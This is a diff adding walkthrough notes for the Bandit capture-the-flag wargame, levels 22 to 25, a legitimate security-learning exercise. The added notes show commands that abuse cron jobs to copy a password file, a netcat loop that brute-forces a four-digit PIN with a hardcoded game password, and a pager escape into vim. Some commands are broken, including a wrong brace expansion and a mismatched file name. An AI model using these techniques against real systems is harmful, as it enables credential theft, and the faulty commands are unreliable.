@@ -71,7 +71,8 @@ or
 ## Level 12
     ls -la
     file data.txt
-    `Scripts`
+    `4_dig_code.sh
+    s`
     decompressor.sh data2.bin
 
 ## Level 13
@@ -128,14 +129,55 @@ or
     cat !$
 
 ## Level 22
+    cd /etc/cron.d
+    ls -la
+    cat cronjob_bandit23
+    cat /usr/bin/cronjob_bandit23.sh
+    echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+    cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 
 ## Level 23
+    d /etc/cron.d
+    ls -la
+    cat cronjob_bandit24
+    cat /usr/bin/cronjob_bandit24.sh
+    mkdir /tmp/<dir>
+    cd /tmp/<dir>
+    nano 4_dig_code.sh
+
+    `cat /etc/bandit_pass/bandit24 > tmp/<dir>/flag`
+
+    chmod +x 4_dig_code.sh
+    ls -la
+    cat flag
 
 ## Level 24
+    mkdir /tmp/<dir>
+    cd !$
+    nano 4_dig_code.sh
 
-## Level 24
+    ``` #!/usr/local/bin/bash
+        pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+        for code in $(0000..9999);
+        do
+            echo $pass' '$code | netcat localhost 30002 >> /tmp/<dir>/results
+        done
+    ```
+
+    chmod +x 4_dig_code.sh
+    ./4_dig_code.sh
+    sort result | uniq -u
 
 ## Level 25
+    ls -la
+    cat /etc/bandit_pass/bandit26
+    cat /usr/bin/showtext
+
+    `Make window less than 6 rows`
+
+    ssh -i bandit26.sshkey bandit26@localhost -p 2220
+
+    `Enter Vim and press Enter`
 
 ## Level 26
 
